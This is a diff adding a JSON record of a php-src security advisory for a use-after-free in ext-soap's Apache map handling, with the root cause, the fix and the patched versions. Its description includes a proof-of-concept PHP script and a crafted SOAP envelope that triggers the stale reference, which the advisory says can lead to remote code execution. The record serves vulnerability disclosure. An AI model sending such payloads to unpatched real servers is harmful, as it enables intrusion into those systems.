@@ -1,0 +1,74 @@
+{
+  "global": null,
+  "id": "GHSA-85c2-q967-79q5",
+  "repo": {
+    "cve_id": "CVE-2026-6722",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.4,
+        "vector_string": "CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:H"
+      }
+    },
+    "cwe_ids": [
+      "CWE-416"
+    ],
+    "description": "ext-soap supports deduplicating objects in the XML graph through `id` and `href`. When traversing the XML graph, ext-soap will remember all plain PHP objects using the hash map `SOAP_GLOBAL(ref_map)`, where the pointer to the libxml2 node acts as a key, and the PHP object as a value. This happens in `soap_add_xml_ref()`.\r\n\r\nhttps://github.com/php/php-src/blob/dcf653339c245e25ea319248d0fc071a9405d688/ext/soap/php_encoding.c#L349-L354\r\n\r\nCrucially, the reference count of the PHP object is _not_ increased. Normally this is not a problem, as all objects in the XML graph are stored in the resulting object graph and cannot be freed.\r\n\r\n`soap_check_xml_ref()` does the opposite of `soap_add_xml_ref()`; it will check whether some libxml2 node as already been evaluated and stored in `SOAP_GLOBAL(ref_map)`.\r\n\r\nhttps://github.com/php/php-src/blob/dcf653339c245e25ea319248d0fc071a9405d688/ext/soap/php_encoding.c#L331-L347\r\n\r\nThe Apache map offers a mechanism to free objects between these two points by overwriting existing map entries.\r\n\r\n```php\r\nclass Handler {\r\n    public function test($map, $stale) {\r\n        global $result;\r\n        $result = $stale;\r\n    }\r\n}\r\n\r\n$envelope = <<<'XML'\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<soapenv:Envelope\r\n    xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\r\n    xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">\r\n\r\n    <soapenv:Body>\r\n        <test>\r\n            <map xsi:type=\"apache:Map\" xmlns:apache=\"http://xml.apache.org/xml-soap\">\r\n                <item>\r\n                    <key>somekey</key>\r\n                    <value id=\"stale\"><object>Stale</object></value>\r\n                </item>\r\n                <item>\r\n                    <key>somekey</key>\r\n                    <value></value>\r\n                </item>\r\n            </map>\r\n            <stale href=\"#stale\"/>\r\n        </test>\r\n    </soapenv:Body>\r\n</soapenv:Envelope>\r\nXML;\r\n\r\n$s = new SoapServer(null, ['uri' => 'urn:a']);\r\n$s->setClass(Handler::class);\r\n$s->handle($envelope);\r\nvar_dump($result);\r\n```\r\n\r\nThis example will:\r\n\r\n- evaluate the `map` node\r\n- evaluate the `Stale` object, which includes calling calling `soap_add_xml_ref()` to remember it in `SOAP_GLOBAL(ref_map)`\r\n- add the resulting object to a temporary map, which will be the result of the Apache map node\r\n- overwrite the object immediately with `NULL` for the `<item>` with an empty `<value>`, releasing the `Stale` object only strongly referenced by the temporary map, with the reference in `SOAP_GLOBAL(ref_map)` becoming stale\r\n- have `<stale href=\"#stale\"/>` refer to this stale pointer within `SOAP_GLOBAL(ref_map)`, reusing the freed memory\r\n\r\nAfter this code, `$result` will refer to the stale memory where `Stale` was previously allocated. The attacker has high control over this memory segment by subsequently allocating plain strings, leading to Remote Code Execution.\r\n\r\nThe solution is straight forward, namely increase the reference count before adding objects to `SOAP_GLOBAL(ref_map)`, and configure a `ZVAL_PTR_DTOR` deallocator to release the objects when the procedure is done.",
+    "ghsa_id": "GHSA-85c2-q967-79q5",
+    "html_url": "https://github.com/php/php-src/security/advisories/GHSA-85c2-q967-79q5",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-85c2-q967-79q5"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-6722"
+      }
+    ],
+    "published_at": "2026-05-07T12:56:25Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Use-After-Free in SOAP using Apache map with Remote Code Execution",
+    "updated_at": "2026-05-07T12:56:25Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.2.31",
+        "vulnerable_version_range": "< 8.2.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.3.31",
+        "vulnerable_version_range": "< 8.3.31"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.4.21",
+        "vulnerable_version_range": "< 8.4.21"
+      },
+      {
+        "package": {
+          "ecosystem": "php",
+          "name": "ext-soap"
+        },
+        "patched_versions": "8.5.6",
+        "vulnerable_version_range": "< 8.5.6"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "php/php-src"
+}
